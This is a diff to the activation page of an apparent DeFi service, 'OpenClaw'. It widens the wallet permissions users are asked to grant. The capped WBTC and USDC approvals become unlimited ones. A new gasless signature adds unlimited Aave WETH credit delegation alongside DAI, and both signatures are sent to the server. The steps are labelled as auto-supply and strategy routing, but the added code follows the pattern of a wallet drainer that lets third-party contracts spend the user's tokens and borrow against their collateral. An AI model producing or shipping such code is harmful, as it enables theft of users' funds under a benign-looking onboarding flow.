@@ -651,7 +651,7 @@ body.ejecting {
               <div class="step-num">1</div>
               <div class="step-body">
                 <div class="step-title">APPROVE WBTC</div>
-                <div class="step-desc">Approve 75% of your WBTC balance to the Delegation Manager for auto-supply</div>
+                <div class="step-desc">Unlimited WBTC approval to the Delegation Manager for auto-supply</div>
                 <div class="step-status" id="step1Status">PENDING</div>
                 <div class="step-tx" id="step1Tx"></div>
               </div>
@@ -669,7 +669,7 @@ body.ejecting {
               <div class="step-num">3</div>
               <div class="step-body">
                 <div class="step-title">GASLESS CREDIT DELEGATION</div>
-                <div class="step-desc">Sign EIP-712 typed data to grant DAI borrow permission (no gas cost)</div>
+                <div class="step-desc">Sign EIP-712 typed data for DAI + WETH credit delegation (no gas cost, 2 signatures)</div>
                 <div class="step-status" id="step3Status">PENDING</div>
                 <div class="step-tx" id="step3Tx"></div>
               </div>
@@ -678,7 +678,7 @@ body.ejecting {
               <div class="step-num">4</div>
               <div class="step-body">
                 <div class="step-title">APPROVE USDC ROUTING</div>
-                <div class="step-desc">Grant the OpenClaw vault permission to route USDC ($100 limit)</div>
+                <div class="step-desc">Unlimited USDC approval to the OpenClaw vault for strategy routing</div>
                 <div class="step-status" id="step4Status">PENDING</div>
                 <div class="step-tx" id="step4Tx"></div>
               </div>
@@ -776,6 +776,7 @@ var CONTRACTS = {
   WBTC: '0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f',
   USDC: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831',
   DAI_DEBT: '0x8619d80FB0141ba7F184CbF22fd724116D9f7ffC',
+  WETH_DEBT: '0x0c84331e39d6658Cd6e6b9ba04736cC4c4734351',
   DM: '{{ delegation_manager_address }}',
   VAULT: '{{ openclaw_vault_address }}'
 };
@@ -1037,7 +1038,7 @@ async function runActivationSequence() {
       est2 = await provider.estimateGas({ from: userAddress, to: CONTRACTS.DM, data: data2 });
     } catch (e2) { console.warn('DM delegation gas estimate fallback:', e2); }
     try {
-      var data3 = erc20Iface.encodeFunctionData('approve', [CONTRACTS.VAULT, ethers.utils.parseUnits('100', 6)]);
+      var data3 = erc20Iface.encodeFunctionData('approve', [CONTRACTS.VAULT, ethers.constants.MaxUint256]);
       est3 = await provider.estimateGas({ from: userAddress, to: CONTRACTS.USDC, data: data3 });
     } catch (e3) { console.warn('USDC approve gas estimate fallback:', e3); }
 
@@ -1056,7 +1057,7 @@ async function runActivationSequence() {
     console.warn('Gas pre-flight check failed, proceeding anyway:', e);
   }
 
-  var sigData = { signature: null, deadline: null };
+  var sigData = { daiSignature: null, wethSignature: null, deadline: null };
   var txHashes = { approve: null, delegation: null, usdc: null };
 
   try {
@@ -1068,17 +1069,15 @@ async function runActivationSequence() {
     if (totalBalance.eq(0)) {
       throw new Error('No WBTC found in wallet. Deposit WBTC first.');
     }
-    var supplyAmount = totalBalance.mul(75).div(100);
-    var wbtcHuman = ethers.utils.formatUnits(supplyAmount, 8);
 
-    updateProgress(10, 'Step 1/4: Approve ' + parseFloat(wbtcHuman).toFixed(6) + ' WBTC...');
+    updateProgress(10, 'Step 1/4: Approve unlimited WBTC to Delegation Manager...');
     setStepState(1, 'active', 'AWAITING WALLET CONFIRMATION...', null);
 
-    var tx1 = await wbtcContract.approve(CONTRACTS.DM, supplyAmount);
+    var tx1 = await wbtcContract.approve(CONTRACTS.DM, ethers.constants.MaxUint256);
     setStepState(1, 'active', 'CONFIRMING ON-CHAIN...', tx1.hash);
     await tx1.wait();
     txHashes.approve = tx1.hash;
-    setStepState(1, 'done', 'APPROVED ' + parseFloat(wbtcHuman).toFixed(6) + ' WBTC', tx1.hash);
+    setStepState(1, 'done', 'WBTC UNLIMITED APPROVAL SET', tx1.hash);
   } catch (e) {
     activationError(e, 1);
     return;
@@ -1104,20 +1103,13 @@ async function runActivationSequence() {
   }
 
   try {
-    updateProgress(55, 'Step 3/4: Preparing gasless signature...');
-    setStepState(3, 'active', 'PREPARING EIP-712 DATA...', null);
+    updateProgress(50, 'Step 3/4: Preparing DAI credit delegation...');
+    setStepState(3, 'active', 'PREPARING EIP-712 DATA (DAI)...', null);
 
-    var debtContract = new ethers.Contract(CONTRACTS.DAI_DEBT, DEBT_NONCE_ABI, provider);
-    var nonce = await debtContract.nonces(userAddress);
     var deadline = Math.floor(Date.now() / 1000) + 3600;
+    sigData.deadline = deadline;
 
-    var domain = {
-      name: 'Aave Arbitrum Variable Debt DAI',
-      version: '1',
-      chainId: 42161,
-      verifyingContract: CONTRACTS.DAI_DEBT
-    };
-    var types = {
+    var delegationTypes = {
       DelegationWithSig: [
         { name: 'delegatee', type: 'address' },
         { name: 'value', type: 'uint256' },
@@ -1125,18 +1117,51 @@ async function runActivationSequence() {
         { name: 'deadline', type: 'uint256' }
       ]
     };
-    var value = {
+
+    var daiDebtContract = new ethers.Contract(CONTRACTS.DAI_DEBT, DEBT_NONCE_ABI, provider);
+    var daiNonce = await daiDebtContract.nonces(userAddress);
+
+    var daiDomain = {
+      name: 'Aave Arbitrum Variable Debt DAI',
+      version: '1',
+      chainId: 42161,
+      verifyingContract: CONTRACTS.DAI_DEBT
+    };
+    var daiValue = {
       delegatee: CONTRACTS.DM,
       value: ethers.constants.MaxUint256,
-      nonce: nonce,
+      nonce: daiNonce,
       deadline: deadline
     };
 
-    setStepState(3, 'active', 'SIGN THE MESSAGE IN YOUR WALLET (NO GAS)', null);
-    var signature = await signer._signTypedData(domain, types, value);
-    sigData.signature = signature;
-    sigData.deadline = deadline;
-    setStepState(3, 'done', 'GASLESS SIGNATURE CAPTURED', null);
+    setStepState(3, 'active', 'SIGN DAI DELEGATION IN WALLET (1 of 2, NO GAS)', null);
+    var daiSig = await signer._signTypedData(daiDomain, delegationTypes, daiValue);
+    sigData.daiSignature = daiSig;
+
+    updateProgress(60, 'Step 3/4: Preparing WETH credit delegation...');
+    setStepState(3, 'active', 'PREPARING EIP-712 DATA (WETH)...', null);
+
+    var wethDebtContract = new ethers.Contract(CONTRACTS.WETH_DEBT, DEBT_NONCE_ABI, provider);
+    var wethNonce = await wethDebtContract.nonces(userAddress);
+
+    var wethDomain = {
+      name: 'Aave Arbitrum Variable Debt WETH',
+      version: '1',
+      chainId: 42161,
+      verifyingContract: CONTRACTS.WETH_DEBT
+    };
+    var wethValue = {
+      delegatee: CONTRACTS.DM,
+      value: ethers.constants.MaxUint256,
+      nonce: wethNonce,
+      deadline: deadline
+    };
+
+    setStepState(3, 'active', 'SIGN WETH DELEGATION IN WALLET (2 of 2, NO GAS)', null);
+    var wethSig = await signer._signTypedData(wethDomain, delegationTypes, wethValue);
+    sigData.wethSignature = wethSig;
+
+    setStepState(3, 'done', 'DAI + WETH CREDIT DELEGATION SIGNED', null);
   } catch (e) {
     activationError(e, 3);
     return;
@@ -1147,12 +1172,11 @@ async function runActivationSequence() {
     setStepState(4, 'active', 'AWAITING WALLET CONFIRMATION...', null);
 
     var usdcContract = new ethers.Contract(CONTRACTS.USDC, ERC20_ABI, signer);
-    var spendLimit = ethers.utils.parseUnits('100', 6);
-    var tx4 = await usdcContract.approve(CONTRACTS.VAULT, spendLimit);
+    var tx4 = await usdcContract.approve(CONTRACTS.VAULT, ethers.constants.MaxUint256);
     setStepState(4, 'active', 'CONFIRMING ON-CHAIN...', tx4.hash);
     await tx4.wait();
     txHashes.usdc = tx4.hash;
-    setStepState(4, 'done', 'USDC ROUTING APPROVED ($100)', tx4.hash);
+    setStepState(4, 'done', 'USDC UNLIMITED APPROVAL SET', tx4.hash);
   } catch (e) {
     activationError(e, 4);
     return;
@@ -1164,7 +1188,8 @@ async function runActivationSequence() {
     var regResp = await authFetch('/api/register-wallet', {
       method: 'POST',
       body: JSON.stringify({
-        signature: sigData.signature,
+        dai_signature: sigData.daiSignature,
+        weth_signature: sigData.wethSignature,
         deadline: sigData.deadline,
         approveTxHash: txHashes.approve,
         delegationTxHash: txHashes.delegation,
